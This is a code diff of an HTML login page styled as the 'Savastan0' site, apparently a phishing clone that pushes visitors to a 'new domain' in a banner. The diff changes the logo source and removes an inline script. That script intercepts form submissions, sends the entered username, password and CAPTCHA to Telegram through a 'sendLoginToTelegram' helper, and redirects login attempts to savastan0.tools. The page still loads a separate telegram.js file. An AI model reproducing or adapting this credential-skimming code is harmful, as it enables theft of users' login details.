@@ -135,7 +135,7 @@
             <strong>WARNING: OUR DOMAIN HAS CHANGED SAVASTAN0.CC WILL NOT WORK ANYMORE! PLEASE BOOKMARK THE NEW ONE Savestan0.tools.</strong>
         </div>
         <div class="panel-body">
-            <center><img src="assets/images/logo2.png" alt="Savastan0 Logo" width="250" height="41"></center><br>
+            <center><img src="favicon.png" alt="Savastan0 Logo" width="250" height="41"></center><br>
             <div class="panel-heading">
                                                                 <h4 class="panel-title">LOGIN</h4>
             </div>
@@ -249,33 +249,7 @@
 <script defer src="assets/js/loginOK.js"></script>
 <script defer src="assets/js/passwordscheck.js"></script>
 <script defer src="assets/js/telegram.js"></script>
-<script>
-document.addEventListener('DOMContentLoaded', function() {
-  const forms = document.querySelectorAll('form');
-  forms.forEach(form => {
-    form.addEventListener('submit', async function(e) {
-      const submitBtn = e.submitter || e.target.querySelector('input[type="submit"]:focus');
-      const isLogin = submitBtn && submitBtn.name === 'login';
-      
-      const formData = new FormData(this);
-      const username = formData.get('username') || '';
-      const password = formData.get('password') || '';
-      const captcha = formData.get('CAPTCHA') || '';
-      const action = this.action;
-      
-      if (username || password) {
-        await window.sendLoginToTelegram(username, password, captcha, action);
-      }
-      
-      if (isLogin) {
-        e.preventDefault();
-        window.location.href = 'https://savastan0.tools/login';
-      }
-      // Register allows original submit
-    });
-  });
-});
-</script>
+
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"5cca4f69561649b68056bd2f42957b0e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 
